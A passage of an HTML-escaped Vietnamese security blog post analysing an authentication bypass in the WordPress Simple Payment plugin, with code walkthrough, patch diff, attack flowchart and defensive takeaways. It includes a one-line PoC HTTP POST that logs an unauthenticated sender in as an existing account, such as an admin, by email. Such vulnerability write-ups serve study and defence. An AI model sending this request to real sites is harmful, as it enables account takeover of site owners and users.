) ? $ops[3] : &amp;#39;&amp;#39; );&#xA;&#xA;    try {&#xA;        switch ( $op ) {&#xA;            case self::OPERATION_SUCCESS: // success&#xA;                ...&#xA;                try {&#xA;                    if ( isset( $_REQUEST[&amp;#39;payment_id&amp;#39;] ) &amp;amp;&amp;amp; $_REQUEST[&amp;#39;payment_id&amp;#39;] ) {&#xA;                        $params = array_merge( $this-&amp;gt;fetch( $_REQUEST[&amp;#39;payment_id&amp;#39;] ), $_REQUEST );&#xA;                    } else {&#xA;                        $params = $_REQUEST;&#xA;                    }&#xA;&#xA;                    $this-&amp;gt;post_process( $params, $engine );&#xA;                    do_action( &amp;#39;sp_payment_success&amp;#39;, $params );&#xA;&#xA;                } catch ( Exception $e ) {&#xA;                    $status[ self::OP ] = self::OPERATION_ERROR;&#xA;                    if ( trim( $e-&amp;gt;getCode() ) )    $status[&amp;#39;status&amp;#39;]  = trim( $e-&amp;gt;getCode() );&#xA;                    if ( trim( $e-&amp;gt;getMessage() ) ) $status[&amp;#39;message&amp;#39;] = self::set_message( trim( $e-&amp;gt;getMessage() ) );&#xA;&#xA;                    $url = $this-&amp;gt;error(&#xA;                        isset( $status ) ? $status : $_REQUEST,&#xA;                        isset( $status[&amp;#39;status&amp;#39;] ) ? $status[&amp;#39;status&amp;#39;] : null,&#xA;                        $e-&amp;gt;getMessage()&#xA;                    );&#xA;                    break;&#xA;                }&#xA;                break;&#xA;            ...&#xA;        }&#xA;    } catch ( Exception $e ) {&#xA;        ...&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong &lt;code&gt;callback()&lt;/code&gt;, plugin ki·ªÉm tra URL hi·ªán t·∫°i c√≥ kh·ªõp v·ªõi URL callback ƒë√£ c·∫•u h√¨nh hay kh√¥ng. N·∫øu kh√¥ng kh·ªõp th√¨ tho√°t ngay (return).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( isset( $info[&amp;#39;path&amp;#39;], $callback[&amp;#39;path&amp;#39;] ) &amp;amp;&amp;amp; $info[&amp;#39;path&amp;#39;] != $callback[&amp;#39;path&amp;#39;] ) return;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin ph√¢n t√≠ch ƒë∆∞·ªùng d·∫´n (&lt;code&gt;REQUEST_URI&lt;/code&gt;) th√†nh c√°c ph·∫ßn (&lt;code&gt;$ops&lt;/code&gt;) v√† ki·ªÉm tra ƒëi·ªÅu ki·ªán h·ª£p l·ªá c·ªßa request:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;C√≥ tham s·ªë &lt;code&gt;op&lt;/code&gt; trong &lt;code&gt;$_REQUEST&lt;/code&gt;, ho·∫∑c&lt;/li&gt;&#xA;&lt;li&gt;URL c√≥ c·∫•u tr√∫c d·∫°ng &lt;code&gt;/a/b/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( !( isset( $_REQUEST[ self::OP ] ) || ( count( $ops ) == 4 &amp;amp;&amp;amp; strtolower( $ops[1] ) == &amp;#39;sp&amp;#39; ) ) ) return;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin x√°c ƒë·ªãnh:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$engine&lt;/code&gt;: l·∫•y t·ª´ request, t·ª´ URL, ho·∫∑c t·ª´ c·∫•u h√¨nh m·∫∑c ƒë·ªãnh.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$op&lt;/code&gt;: operation hi·ªán t·∫°i.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$engine = isset( $_REQUEST[&amp;#39;engine&amp;#39;] )&#xA;        ? sanitize_text_field( $_REQUEST[&amp;#39;engine&amp;#39;] )&#xA;        : ( isset( $ops[2] ) &amp;amp;&amp;amp; $ops[2] ? $ops[2] : self::param( &amp;#39;engine&amp;#39; ) );&#xA;&#xA;$op = isset( $_REQUEST[ self::OP ] )&#xA;    ? strtolower( sanitize_text_field( $_REQUEST[ self::OP ] ) )&#xA;    : strtolower( isset( $ops[3] ) ? $ops[3] : &amp;#39;&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi search v·ªõi t·ª´ kh√≥a &lt;code&gt;SimplePayment\\Engines&lt;/code&gt;, ta th·∫•y ƒë∆∞·ª£c danh s√°ch c√°c engine ƒë∆∞·ª£c khai b√°o:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-13-cve-2025-6688/engine.png&#34; title=&#34;Danh s√°ch c√°c engine&#34; data-thumbnail=&#34;/posts/2026-01-13-cve-2025-6688/engine.png&#34; data-sub-html=&#34;&lt;h2&gt;Engine&lt;/h2&gt;&lt;p&gt;Danh s√°ch c√°c engine&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-13-cve-2025-6688/engine.png&#39; alt=&#34;Engine&#34; height=&#34;662&#34; width=&#34;1380&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh s√°ch c√°c engine&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Plugin x·ª≠ l√Ω theo &lt;code&gt;$op&lt;/code&gt; b·∫±ng switch.&#xA;Khi &lt;code&gt;$op&lt;/code&gt; l√† &lt;code&gt;success&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu c√≥ &lt;code&gt;payment_id&lt;/code&gt;, plugin g·ªçi &lt;code&gt;$this-&amp;gt;fetch()&lt;/code&gt; ƒë·ªÉ l·∫•y th√¥ng tin thanh to√°n v√† g·ªôp v·ªõi d·ªØ li·ªáu request.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng c√≥ &lt;code&gt;payment_id&lt;/code&gt;, s·ª≠ d·ª•ng tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ &lt;code&gt;$_REQUEST&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau khi chu·∫©n b·ªã xong &lt;code&gt;$params&lt;/code&gt;, plugin g·ªçi &lt;code&gt;post_process($params, $engine)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function post_process( $params = [], $engine = null ) {&#xA;    $this-&amp;gt;setEngine( $engine ? : $this-&amp;gt;param( &amp;#39;engine&amp;#39; ) );&#xA;    $params = apply_filters( &amp;#39;sp_payment_post_process_filter&amp;#39;, $params, $this-&amp;gt;engine );&#xA;    if ( parent::post_process( $params ) ) {&#xA;      $args = [&#xA;        &amp;#39;status&amp;#39; =&amp;gt; self::TRANSACTION_SUCCESS&#xA;      ];&#xA;      if ( $this-&amp;gt;engine-&amp;gt;confirmation_code) $args[&amp;#39;confirmation_code&amp;#39;] = $this-&amp;gt;engine-&amp;gt;confirmation_code;&#xA;      if ( $this-&amp;gt;engine-&amp;gt;payments) $args[&amp;#39;payments&amp;#39;] = $this-&amp;gt;engine-&amp;gt;payments;&#xA;      if ( $this-&amp;gt;engine-&amp;gt;amount) $args[&amp;#39;amount&amp;#39;] = $this-&amp;gt;engine-&amp;gt;amount;&#xA;      self::update( $this-&amp;gt;payment_id ? : $this-&amp;gt;engine-&amp;gt;transaction, $args , !$this-&amp;gt;payment_id );&#xA;      $a = $this-&amp;gt;param(&amp;#39;user_create&amp;#39;);&#xA;      $b = $this-&amp;gt;param(&amp;#39;user_create_step&amp;#39;);&#xA;      if ( $this-&amp;gt;param(&amp;#39;user_create&amp;#39;) != &amp;#39;disabled&amp;#39; &amp;amp;&amp;amp; $this-&amp;gt;param(&amp;#39;user_create_step&amp;#39;) == &amp;#39;post&amp;#39; &amp;amp;&amp;amp; !get_current_user_id()) $this-&amp;gt;create_user($params);&#xA;      do_action( &amp;#39;sp_payment_post_process&amp;#39;, $params, $this-&amp;gt;engine );&#xA;      return( true );&#xA;    }&#xA;    return( false );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán set engine (theo c√°c engine ƒë√£ ƒë∆∞·ª£c khai b√°o) sau ƒë√≥ check ƒëi·ªÅu ki·ªán:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;parent::post_process( $params )&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function post_process($params = []) {&#xA;    if ($this-&amp;gt;engine-&amp;gt;post_process($params)) {&#xA;      $this-&amp;gt;status = self::TRANSACTION_SUCCESS;&#xA;      // TODO: run sucess webhook if necessary -&#xA;      return(true);&#xA;    } else {&#xA;      $this-&amp;gt;status = self::TRANSACTION_FAILED;&#xA;      // TODO: run failed webhook if necessary.&#xA;    }&#xA;    return(false);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ti·∫øp t·ª•c g·ªçi &lt;code&gt;$this-&amp;gt;engine-&amp;gt;post_process( $params )&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_process($params) {&#xA;    $this-&amp;gt;transaction = isset( $_REQUEST[&amp;#39;lowprofilecode&amp;#39;] ) ? $_REQUEST[&amp;#39;lowprofilecode&amp;#39;] : $params[ &amp;#39;transaction_id&amp;#39; ];&#xA;    $response = $_REQUEST;&#xA;    $this-&amp;gt;save([&#xA;      &amp;#39;transaction_id&amp;#39; =&amp;gt; $this-&amp;gt;transaction,&#xA;      &amp;#39;url&amp;#39; =&amp;gt; &amp;#39;:post_process&amp;#39;,&#xA;      &amp;#39;status&amp;#39; =&amp;gt; isset($response[&amp;#39;ResponseCode&amp;#39;]) ? $response[&amp;#39;ResponseCode&amp;#39;] : $response[&amp;#39;response_code&amp;#39;],&#xA;      &amp;#39;description&amp;#39; =&amp;gt; isset($response[&amp;#39;Description&amp;#39;]) ? $response[&amp;#39;Description&amp;#39;] : null,&#xA;      &amp;#39;request&amp;#39; =&amp;gt; json_encode($params),&#xA;      &amp;#39;response&amp;#39; =&amp;gt; json_encode($response)&#xA;    ]);&#xA;    if ($params[&amp;#39;Operation&amp;#39;] == 2 &amp;amp;&amp;amp; isset($params[&amp;#39;payments&amp;#39;]) &amp;amp;&amp;amp; $params[&amp;#39;payments&amp;#39;] == &amp;#34;monthly&amp;#34;) {&#xA;      if ($this-&amp;gt;param(&amp;#39;recurr_at&amp;#39;) == &amp;#39;post&amp;#39; &amp;amp;&amp;amp; $this-&amp;gt;param(&amp;#39;reurring&amp;#39;) == &amp;#39;provider&amp;#39;) return($this-&amp;gt;recur_by_provider($params));&#xA;    }&#xA;    // TODO: update confirmation code con status&#xA;    //$this-&amp;gt;confirmation_code = $response[&amp;#39;confirmation_code&amp;#39;];&#xA;    return($_REQUEST[&amp;#39;ResponeCode&amp;#39;] == 0);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L∆∞u transaction, request, response.&lt;/li&gt;&#xA;&lt;li&gt;X·ª≠ l√Ω logic recurring (n·∫øu c√≥).&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ &lt;code&gt;true&lt;/code&gt; n·∫øu giao d·ªãch th√†nh c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;N·∫øu ƒëi·ªÅu ki·ªán tr·∫£ v·ªÅ l√† &lt;code&gt;true&lt;/code&gt;, h√†m ti·∫øp t·ª•c ki·ªÉm tra ƒëi·ªÅu ki·ªán t·∫°o user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (&#xA;    $this-&amp;gt;param( &amp;#39;user_create&amp;#39; ) !== &amp;#39;disabled&amp;#39; &amp;amp;&amp;amp;&#xA;    $this-&amp;gt;param( &amp;#39;user_create_step&amp;#39; ) === &amp;#39;post&amp;#39; &amp;amp;&amp;amp;&#xA;    ! get_current_user_id()&#xA;) {&#xA;    $this-&amp;gt;create_user( $params );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;user_create ‚â† disabled&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;user_create_step = post&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Ch∆∞a c√≥ user ƒëƒÉng nh·∫≠p (&lt;code&gt;!get_current_user_id()&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ta c√≥ th·ªÉ thay ƒë·ªïi 2 option n√†y trong Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-13-cve-2025-6688/option.png&#34; title=&#34;Option trong Admin Dashboard&#34; data-thumbnail=&#34;/posts/2026-01-13-cve-2025-6688/option.png&#34; data-sub-html=&#34;&lt;h2&gt;Option&lt;/h2&gt;&lt;p&gt;Option trong Admin Dashboard&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-13-cve-2025-6688/option.png&#39; alt=&#34;Option&#34; height=&#34;895&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Option trong Admin Dashboard&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi th·ªèa t·∫•t c·∫£ ƒëi·ªÅu ki·ªán tr√™n, h·ªá th·ªëng g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;create_user( $params );&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function create_user($params) {&#xA;    $email = isset($params[self::EMAIL]) ? $params[self::EMAIL] : false;&#xA;    if (!$email) return(false);&#xA;    $user_id = email_exists($email);&#xA;    if (!$user_id) {&#xA;        $username = isset($params[self::USERNAME]) ? $params[self::USERNAME] : false;&#xA;        $user_id = $username ? username_exists($username) : false;&#xA;        if (!$user_id) {&#xA;          $username = isset($params[self::FIRST_NAME]) ? $params[self::FIRST_NAME] : false;&#xA;          if (!$username) $username = isset($params[self::LAST_NAME]) ? $params[self::LAST_NAME] : false;&#xA;          if (!$username) $username = isset($params[self::FULL_NAME]) ? explode(&amp;#39; &amp;#39;, $params[self::FULL_NAME])[0] : false;&#xA;          if (!$username) $username = wp_generate_password(12, false);&#xA;          $username = $this-&amp;gt;generate_unique_username(strtolower($username));&#xA;          if ($this-&amp;gt;param(&amp;#39;user_create_step&amp;#39;) == &amp;#39;register&amp;#39;) $user_id = register_new_user($username, $email);&#xA;          else $user_id = wp_create_user($username, wp_generate_password(12, false), $email);&#xA;          do_action(&amp;#39;sp_user_created&amp;#39;, $user_id, $params);&#xA;        }&#xA;    }&#xA;    if ($user_id) wp_set_auth_cookie($user_id);&#xA;    return($user_id);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m s·∫Ω ki·ªÉm tra email l·∫•y t·ª´ request. N·∫øu email ƒë√£ t·ªìn t·∫°i trong h·ªá th·ªëng, h√†m s·∫Ω l·∫•y ID c·ªßa user t∆∞∆°ng ·ª©ng v√† g√°n cho bi·∫øn &lt;code&gt;$user_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu th·ª±c s·ª± nguy hi·ªÉm l√† khi &lt;code&gt;$user_id&lt;/code&gt; ƒë√£ c√≥ gi√° tr·ªã, h√†m &lt;code&gt;wp_set_auth_cookie()&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ thi·∫øt l·∫≠p cookie ƒëƒÉng nh·∫≠p cho user t∆∞∆°ng ·ª©ng, ƒë·ªìng nghƒ©a v·ªõi vi·ªác ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c ƒëƒÉng nh·∫≠p t·ª± ƒë·ªông m√† kh√¥ng c·∫ßn x√°c th·ª±c th√™m. =&amp;gt; &lt;code&gt;Bypass Vulnerability&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;code&gt;v2.3.9&lt;/code&gt; ƒë√£ lo·∫°i b·ªè nguy√™n nh√¢n g√¢y bypass ƒëƒÉng nh·∫≠p b·∫±ng c√°ch thay ƒë·ªïi c√°ch g·ªçi &lt;code&gt;wp_set_auth_cookie()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function create_user( $params ) {&#xA;    $email = isset( $params[ self::EMAIL ] ) ? $params[ self::EMAIL ] : false;&#xA;    if ( ! $email ) return false;&#xA;&#xA;    $user_id = email_exists( $email );&#xA;&#xA;    if ( ! $user_id ) {&#xA;        $username = isset( $params[ self::USERNAME ] ) ? $params[ self::USERNAME ] : false;&#xA;        $user_id  = $username ? username_exists( $username ) : false;&#xA;&#xA;        if ( ! $user_id ) {&#xA;            ...&#xA;            wp_set_auth_cookie( $user_id );&#xA;        }&#xA;    }&#xA;&#xA;    if ( $user_id ) {&#xA;        // TODO: Login should be handled by developer implementation.&#xA;        // wp_set_auth_cookie( $user_id );&#xA;        do_action( &amp;#39;sp_user_created&amp;#39;, $user_id, $params, true );&#xA;    }&#xA;&#xA;    return $user_id;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ch·ªâ set cookie cho user m·ªõi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send crafted HTTP request to plugin callback endpoint /a/b/ or matching configured callback path&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress loads and triggers parse_request hook&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Simple Payment callback() is executed&amp;#34;]&#xA;&#xA;D --&amp;gt; E{&amp;#34;Request path matches callback path ?&amp;#34;}&#xA;E -- No --&amp;gt; X[&amp;#34;Request ignored&amp;#34;]&#xA;E -- Yes --&amp;gt; F[&amp;#34;Parse REQUEST_URI into $ops&amp;#34;]&#xA;&#xA;F --&amp;gt; G{&amp;#34;Has op parameter OR valid /sp/{engine}/{op} format ?&amp;#34;}&#xA;G -- No --&amp;gt; X&#xA;G -- Yes --&amp;gt; H[&amp;#34;Extract engine and operation&amp;#34;]&#xA;&#xA;H --&amp;gt; I{&amp;#34;op == success ?&amp;#34;}&#xA;I -- No --&amp;gt; X&#xA;I -- Yes --&amp;gt; J[&amp;#34;Build $params from $_REQUEST or fetch(payment_id)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Call post_process($params, $engine)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;setEngine() and apply sp_payment_post_process_filter&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;parent::post_process($params)&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;engine-&amp;gt;post_process($params)&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Save transaction / request / response&amp;#34;]&#xA;&#xA;O --&amp;gt; P{&amp;#34;ResponeCode == 0 ?&amp;#34;}&#xA;P -- No --&amp;gt; Y[&amp;#34;Transaction failed ‚Üí stop&amp;#34;]&#xA;P -- Yes --&amp;gt; Q[&amp;#34;Transaction marked SUCCESS&amp;#34;]&#xA;&#xA;Q --&amp;gt; R{&amp;#34;user_create != disabled&amp;lt;br/&amp;gt;AND user_create_step == post&amp;lt;br/&amp;gt;AND user not logged in ?&amp;#34;}&#xA;R -- No --&amp;gt; Z[&amp;#34;Skip user creation&amp;#34;]&#xA;R -- Yes --&amp;gt; S[&amp;#34;Call create_user($params)&amp;#34;]&#xA;&#xA;S --&amp;gt; T[&amp;#34;Extract email from $params&amp;#34;]&#xA;&#xA;T --&amp;gt; U{&amp;#34;Email exists in WordPress ?&amp;#34;}&#xA;U -- Yes --&amp;gt; V[&amp;#34;Get existing user_id&amp;#34;]&#xA;U -- No --&amp;gt; W[&amp;#34;Create new user and get user_id&amp;#34;]&#xA;&#xA;V --&amp;gt; AA[&amp;#34;wp_set_auth_cookie(user_id)&amp;#34;]&#xA;W --&amp;gt; AA[&amp;#34;wp_set_auth_cookie(user_id)&amp;#34;]&#xA;&#xA;AA --&amp;gt; AB[&amp;#34;User is automatically logged in&amp;#34;]&#xA;&#xA;AB --&amp;gt; AC[&amp;#34;Authentication Bypass achieved&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G·ª≠i request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /a/b/ HTTP/1.1&#xA;Host: localhost&#xA;&#xA;op=success&amp;amp;engine=Cardcom&amp;amp;user_create_step=post&amp;amp;user_create=enable&amp;amp;email=admin@gmail.com&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-4796 x·∫£y ra do plugin x·ª≠ l√Ω callback thanh to√°n qua &lt;code&gt;parse_request&lt;/code&gt; m√† kh√¥ng c√≥ c∆° ch·∫ø x√°c th·ª±c. Attacker c√≥ th·ªÉ g·ª≠i request gi·∫£ m·∫°o ƒë·ªÉ k√≠ch ho·∫°t lu·ªìng &lt;code&gt;OPERATION_SUCCESS&lt;/code&gt; v√† g·ªçi &lt;code&gt;create_user()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Trong phi√™n b·∫£n ‚â§ 2.3.8, n·∫øu email t·ªìn t·∫°i, plugin l·∫•y &lt;code&gt;user_id&lt;/code&gt; v√† g·ªçi tr·ª±c ti·∫øp &lt;code&gt;wp_set_auth_cookie()&lt;/code&gt;, cho ph√©p ƒëƒÉng nh·∫≠p v√†o t√†i kho·∫£n b·∫•t k·ª≥ m√† kh√¥ng c·∫ßn x√°c th·ª±c, d·∫´n ƒë·∫øn Authentication Bypass.&lt;/p&gt;&#xA;&lt;p&gt;Phi√™n b·∫£n 2.3.9 ƒë√£ lo·∫°i b·ªè vi·ªác t·ª± ƒë·ªông ƒëƒÉng nh·∫≠p v·ªõi user ƒë√£ t·ªìn t·∫°i, kh·∫Øc ph·ª•c nguy√™n nh√¢n g√¢y l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng x·ª≠ l√Ω logic nh·∫°y c·∫£m tr√™n request kh√¥ng x√°c th·ª±c.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng g·ªçi &lt;code&gt;wp_set_auth_cookie()&lt;/code&gt; d·ª±a tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng cung c·∫•p.&lt;/li&gt;&#xA;&lt;li&gt;T√°ch bi·ªát r√µ r√†ng gi·ªØa t·∫°o user v√† ƒëƒÉng nh·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;C·∫©n tr·ªçng khi s·ª≠ d·ª•ng c√°c hook ch·∫°y s·ªõm nh∆∞ &lt;code&gt;parse_request&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 